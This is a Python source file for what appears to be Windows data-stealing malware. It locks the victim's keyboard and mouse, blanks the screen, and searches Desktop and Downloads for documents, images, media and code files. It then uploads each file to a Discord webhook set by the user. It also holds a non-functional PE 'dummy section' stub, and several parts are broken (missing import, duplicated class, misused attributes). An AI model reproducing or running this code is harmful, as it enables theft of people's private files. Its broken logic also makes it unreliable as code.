import os
import requests
import time
from threading import Thread
from win32gui import EnumWindows, IsWindowVisible, GetWindowLong, ShowWindow, SetWindowLong
from win32con import GWL_EXSTYLE, WS_EX_TOOLWINDOW, SW_HIDE

# Disable mouse and keyboard input during file search
def disable_input():
    ctypes.windll.user32.BlockInput(True)
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)

# Enable mouse and keyboard input after file search
def enable_input():
    ctypes.windll.user32.BlockInput(False)
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, -1)

class BlacklistedDirs:
    def __init__(self):
        self.BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\$Recycle.Bin\\','C:\\AMD\\']

def enum_windows(hwnd, window_list):
    window_list.append(hwnd)

class BlacklistedDirs:
    def __init__(self):
        self.BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\$Recycle.Bin\\','C:\\AMD\\']

def add_dummy_section(pe, section_name, virtual_size=1024, flags=0x60000):
    pe.OPTIONAL_HEADER.DATA_DIRECTORY[0].Size = len(pe.sections)
    new_section = (ctypes.c_ubyte * virtual_size)()
    pe.sections.append(ctypes.create_string_buffer(section_name.encode('utf-8') + b'\0', 1024))
    return

def get_user_directories():
    user_directory = os.path.join(os.environ['USERPROFILE'], '')
    return [os.path.join(user_directory, 'Desktop'), os.path.join(user_directory, 'Downloads')]

def check_file(file_path, allowed_extensions):
    if not os.path.splitext(file_path)[1].lower() in allowed_extensions:
        print(f"Skipping file {file_path} - invalid file type")
        return False
    elif os.path.getsize(file_path) > 8 * 1024 * 1024: # 8MB limit
        print(f"Skipping file {file_path} - file size too large")
        return False
    else:
        return True

class WebhookUploader:
    def __init__(self, webhook_url):
        self.WEBHOOK_URL = webhook_url
        self.headers = {"User-Agent": "Mozilla/5.0"}

    def upload_file(self, file_path):
        try:
            with open(file_path, "rb") as f:
                files = {"file": f}
                response = requests.post(self.WEBHOOK_URL, headers=self.headers, files=files)
                if response.status_code == 429:
                    print(f"Rate limit exceeded - waiting for {response.json()['retry_after']} seconds")
                    time.sleep(response.json()["retry_after"]/1000)
                    self.upload_file(file_path)
                elif response.status_code != 200:
                    print(f"Failed to upload file {file_path} - error {response.status_code}")
                else:
                    print(f"Successfully uploaded file {file_path}")
        except Exception as e:
            print(f"Failed to upload file {file_path} - {str(e)}")

class FileSearcher(Thread):
    def __init__(self, root_dir, allowed_extensions, uploader):
        Thread.__init__(self)
        self.root_dir = root_dir
        self.allowed_extensions = allowed_extensions
        self.uploader = uploader

    def run(self):
        for root, dirs, files in os.walk(self.root_dir):
            if any(blacklisted_dir in root for blacklisted_dir in BlacklistedDirs.BLACKLISTED_DIRS):
                continue
            for file in files:
                file_path = os.path.join(root, file)
                add_dummy_section(ctypes.create_string_buffer(file_path), 'dummy_section')
                if check_file(file_path, self.allowed_extensions):
                    self.uploader.upload_file(file_path)

def thread_files(uploader):
    threads = []
    user_directories = get_user_directories()
    for root_dir in user_directories:
        thread = FileSearcher(root_dir, ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif','.mp4','.mp3','.py','.js','.mkv','.docx','.xls'], uploader)
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

def main():
    disable_input()
    webhook_url = "place your discord webhook here"
    uploader = WebhookUploader(webhook_url)
    thread_files(uploader)
    enable_input()

if __name__ == "__main__":
    main()
